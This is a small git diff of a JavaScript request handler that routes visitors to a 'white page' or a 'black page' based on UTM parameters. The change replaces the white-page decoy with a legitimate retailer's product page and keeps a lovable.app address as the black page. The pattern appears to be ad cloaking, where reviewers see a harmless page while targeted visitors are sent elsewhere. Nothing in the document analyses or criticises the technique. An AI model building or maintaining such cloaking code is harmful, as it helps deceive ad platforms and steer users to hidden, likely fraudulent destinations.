@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://rustans.com/products/winfun-baby-activity-gift-set";
+    const whitePageURL = "https://www.myhomeware.com.au/products/otus-slimline-182-or-220mm-stainless-steel-water-spout-variant-colour";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
